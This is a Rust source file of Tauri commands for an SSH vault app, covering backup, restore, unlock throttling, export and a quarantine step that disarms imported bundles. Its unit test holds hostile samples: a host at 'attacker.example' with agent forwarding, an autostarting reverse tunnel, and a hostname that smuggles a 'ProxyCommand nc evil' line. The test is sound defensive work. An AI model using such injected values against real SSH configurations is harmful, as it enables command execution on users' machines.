use std::path::PathBuf;

use citadel_vault::{
    Backup, Bundle, Endpoint, Entry, Forward, KdfParams, LockState, MergeReport, list_backups,
    secret_from,
};
use serde::Serialize;
use tauri::State;

use super::{AppState, blocking};
use crate::dto::VaultStatus;
use crate::error::{AppError, CmdResult};
use crate::safety;

const MIN_PASSWORD: usize = 8;

fn strong_enough(pw: &str) -> CmdResult<()> {
    if pw.chars().count() < MIN_PASSWORD {
        return Err(AppError::invalid(format!(
            "master password must be at least {MIN_PASSWORD} characters"
        )));
    }
    Ok(())
}

#[tauri::command]
pub async fn vault_status(state: State<'_, AppState>) -> CmdResult<VaultStatus> {
    let core = state.0.clone();
    blocking(move || {
        let backups = list_backups(&safety::backups_dir(&core.dirs.data));
        let unreadable = if core.vault.is_unlocked() {
            core.vault.health().map(|h| h.unreadable).unwrap_or(0)
        } else {
            0
        };
        Ok(VaultStatus {
            state: core.vault.state(),
            path: core.vault.path().display().to_string(),
            autolock_minutes: core.prefs().autolock_minutes,
            backups: backups.len(),
            latest_backup_ms: backups.first().map(|b| b.created_ms),
            unreadable,
        })
    })
    .await
}

#[derive(Serialize)]
pub struct BackupView {
    pub path: String,
    pub created_ms: u64,
    pub bytes: u64,
}

impl From<Backup> for BackupView {
    fn from(b: Backup) -> Self {
        Self {
            path: b.path.display().to_string(),
            created_ms: b.created_ms,
            bytes: b.bytes,
        }
    }
}

#[tauri::command]
pub async fn backups_list(state: State<'_, AppState>) -> CmdResult<Vec<BackupView>> {
    let dir = safety::backups_dir(&state.0.dirs.data);
    blocking(move || Ok(list_backups(&dir).into_iter().map(Into::into).collect())).await
}

#[tauri::command]
pub async fn backup_now(state: State<'_, AppState>) -> CmdResult<BackupView> {
    let vault = state.0.vault.clone();
    let dir = safety::backups_dir(&state.0.dirs.data);
    blocking(move || Ok(vault.backup_to(&dir, safety::KEEP)?.into())).await
}

#[tauri::command]
pub async fn backup_restore(
    state: State<'_, AppState>,
    path: String,
    password: String,
    replace: bool,
) -> CmdResult<MergeReport> {
    let pw = secret_from(password);
    let vault = state.0.vault.clone();
    let dir = safety::backups_dir(&state.0.dirs.data);
    blocking(move || {
        if std::fs::metadata(&path)?.len() > 128 << 20 {
            return Err(AppError::invalid("backup exceeds 128 MiB"));
        }
        let blob = std::fs::read(&path)?;
        if vault.state() == LockState::Unlocked {
            vault.backup_to(&dir, safety::KEEP)?;
        }
        Ok(vault.restore(&blob, &pw, replace)?)
    })
    .await
}

#[tauri::command]
pub async fn vault_create(state: State<'_, AppState>, password: String) -> CmdResult<()> {
    let pw = secret_from(password);
    strong_enough(citadel_vault::ExposeSecret::expose_secret(&pw))?;
    let vault = state.0.vault.clone();
    blocking(move || Ok(vault.initialize(&pw, KdfParams::RECOMMENDED)?)).await
}

#[tauri::command]
pub async fn vault_unlock(state: State<'_, AppState>, password: String) -> CmdResult<()> {
    let pw = secret_from(password);
    let mut fails = state.0.unlock_gate.lock().await;
    let vault = state.0.vault.clone();
    let res = blocking(move || Ok(vault.unlock(&pw)?)).await;
    match &res {
        Ok(()) => *fails = 0,
        Err(AppError::Vault(citadel_vault::VaultError::BadPassword)) => {
            *fails = fails.saturating_add(1);
            let exp = (*fails).saturating_sub(1).min(6);
            let delay = std::time::Duration::from_millis(500u64 << exp)
                .min(std::time::Duration::from_secs(30));
            tokio::time::sleep(delay).await;
        }
        Err(_) => {}
    }
    res
}

#[tauri::command]
pub async fn vault_lock(state: State<'_, AppState>) -> CmdResult<()> {
    state.0.vault.lock();
    Ok(())
}

#[tauri::command]
pub async fn vault_change_password(
    state: State<'_, AppState>,
    current: String,
    next: String,
) -> CmdResult<()> {
    let (cur, nxt) = (secret_from(current), secret_from(next));
    strong_enough(citadel_vault::ExposeSecret::expose_secret(&nxt))?;
    let vault = state.0.vault.clone();
    blocking(move || Ok(vault.change_password(&cur, &nxt, KdfParams::RECOMMENDED)?)).await
}

#[tauri::command]
pub async fn vault_export(
    state: State<'_, AppState>,
    path: String,
    password: String,
) -> CmdResult<u64> {
    let pw = secret_from(password);
    strong_enough(citadel_vault::ExposeSecret::expose_secret(&pw))?;
    let vault = state.0.vault.clone();
    blocking(move || {
        let blob = vault.export(&pw, KdfParams::RECOMMENDED)?;
        let path = PathBuf::from(path);
        let tmp = path.with_extension("ctdl.part");
        std::fs::write(&tmp, &blob)?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o600))?;
        }
        std::fs::rename(&tmp, &path)?;
        Ok(blob.len() as u64)
    })
    .await
}

#[derive(Default, Serialize)]
pub struct Neutralized {
    pub autostart: usize,
    pub agent_forward: usize,
    pub host_keys: usize,
    pub rejected: usize,
}

#[derive(Serialize)]
pub struct ImportOutcome {
    pub report: MergeReport,
    pub neutralized: Neutralized,
}

fn tidy(v: &str, max: usize) -> Option<String> {
    let v = v.trim();
    (!v.is_empty() && v.len() <= max && !v.chars().any(char::is_control)).then(|| v.to_owned())
}

fn token(v: &str, max: usize) -> Option<String> {
    tidy(v, max).filter(|t| !t.contains(char::is_whitespace))
}

fn endpoint_ok(e: &Endpoint) -> bool {
    token(&e.host, 253).is_some()
}

pub(crate) fn quarantine(entries: Vec<Entry>) -> (Vec<Entry>, Neutralized) {
    let mut n = Neutralized::default();
    let mut out = Vec::with_capacity(entries.len());
    for e in entries {
        let kept = match e {
            Entry::Host(mut h) => {
                let ok = tidy(&h.label, 128).is_some()
                    && token(&h.hostname, 253).is_some()
                    && token(&h.user, 64).is_some()
                    && h.port != 0
                    && h.workspace
                        .as_deref()
                        .is_none_or(|w| tidy(w, 128).is_some())
                    && h.ssh_alias
                        .as_deref()
                        .is_none_or(|a| token(a, 128).is_some());
                if ok {
                    if h.agent_forward {
                        h.agent_forward = false;
                        n.agent_forward += 1;
                    }
                    h.tags.retain(|t| tidy(t, 64).is_some());
                    h.keepalive_secs = h.keepalive_secs.min(600);
                    Some(Entry::Host(h))
                } else {
                    None
                }
            }
            Entry::Tunnel(mut t) => {
                let ok = tidy(&t.label, 128).is_some()
                    && match &t.forward {
                        Forward::Local { bind, dest } | Forward::Remote { bind, dest } => {
                            endpoint_ok(bind) && endpoint_ok(dest)
                        }
                        Forward::Dynamic { bind } => endpoint_ok(bind),
                    };
                if ok {
                    if t.autostart {
                        t.autostart = false;
                        n.autostart += 1;
                    }
                    Some(Entry::Tunnel(t))
                } else {
                    None
                }
            }
            Entry::KnownHost(_) => {
                n.host_keys += 1;
                continue;
            }
            Entry::Identity(k) => tidy(&k.label, 128).is_some().then_some(Entry::Identity(k)),
            Entry::Snippet(s) => (tidy(&s.label, 128).is_some() && s.body.len() <= 64 * 1024)
                .then_some(Entry::Snippet(s)),
            Entry::SyncTarget(t) => tidy(&t.label, 128)
                .is_some()
                .then_some(Entry::SyncTarget(t)),
            Entry::Tombstone(t) => Some(Entry::Tombstone(t)),
        };
        match kept {
            Some(e) => out.push(e),
            None => n.rejected += 1,
        }
    }
    (out, n)
}

#[tauri::command]
pub async fn vault_import(
    state: State<'_, AppState>,
    path: String,
    password: String,
    replace: bool,
) -> CmdResult<ImportOutcome> {
    let pw = secret_from(password);
    let vault = state.0.vault.clone();
    let dir = safety::backups_dir(&state.0.dirs.data);
    blocking(move || {
        vault.backup_to(&dir, safety::KEEP)?;
        let meta = std::fs::metadata(&path)?;
        if meta.len() > 128 << 20 {
            return Err(AppError::invalid("bundle exceeds 128 MiB"));
        }
        let blob = std::fs::read(&path)?;
        let bundle = Bundle::open(&blob, &pw)?;
        let (entries, neutralized) = quarantine(bundle.entries);
        let report = if replace {
            vault.replace(&entries)?
        } else {
            vault.merge(entries)?
        };
        Ok(ImportOutcome {
            report,
            neutralized,
        })
    })
    .await
}

#[cfg(test)]
mod tests {
    use super::*;
    use citadel_vault::{Auth, HostProfile, Id, KnownHost, TunnelSpec};

    #[test]
    fn quarantine_disarms_imported_bundles() {
        let mut h = HostProfile::new(
            "evil",
            "attacker.example",
            "ops",
            Auth::Agent { fingerprint: None },
        )
        .unwrap();
        h.agent_forward = true;
        let mut t = TunnelSpec::new(
            "rev",
            h.id,
            Forward::Remote {
                bind: Endpoint::new("0.0.0.0", 9000),
                dest: Endpoint::new("10.0.0.1", 22),
            },
        )
        .unwrap();
        t.autostart = true;
        let kh = KnownHost {
            id: Id::random().unwrap(),
            host: "github.com".into(),
            port: 22,
            algorithm: "ssh-ed25519".into(),
            key: "AAAA".into(),
            fingerprint: "SHA256:x".into(),
            updated_ms: 0,
        };
        let inject =
            HostProfile::new("x", "h\nProxyCommand nc evil 1", "ops", Auth::Interactive).unwrap();
        let (out, n) = quarantine(vec![
            Entry::Host(h),
            Entry::Tunnel(t),
            Entry::KnownHost(kh),
            Entry::Host(inject),
        ]);
        assert_eq!(
            (n.agent_forward, n.autostart, n.host_keys, n.rejected),
            (1, 1, 1, 1)
        );
        assert_eq!(out.len(), 2);
        for e in &out {
            match e {
                Entry::Host(h) => assert!(!h.agent_forward),
                Entry::Tunnel(t) => assert!(!t.autostart),
                other => panic!("unexpected {other:?}"),
            }
        }
    }
}
